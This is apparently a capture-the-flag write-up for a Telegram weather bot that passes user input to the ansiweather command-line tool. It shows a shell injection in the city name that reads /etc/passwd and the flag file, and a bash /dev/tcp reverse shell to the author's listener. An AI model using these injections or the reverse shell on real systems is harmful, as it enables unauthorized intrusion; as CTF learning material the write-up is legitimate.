# MISC //   🌤️ Weather
 
Tired of looking outside your window to check the weather? Use our bot. It's on telegram, so it has to be safe!

https://t.me/eetua0gahf_bot

# Writeup

Creating a Telegram account and adding the bot I get this: 

![](image.png)

Adding dummy data to break it I get this:

![](image-1.png)

That error message matches a software named `ansiweather` which is a command line tool for weather forecasts. So are we injecting into command line?

![](image-2.png)

After a bit of trial and error @decoy sends me this:

```bash
Arendal" && cat /etc/passwd #
```

And we get the `lfi`:

![](image-3.png)

Now just find the flag with `ls` and then `cat`

![](image-4.png)

# Reverse Shell

Using `nc -knlvp 1234` on my remote server and running `/weather Norway" && bash -i >& /dev/tcp/<MY IP>/1234 0>&1 & #` I get remote shell.

![Alt text](image-6.png)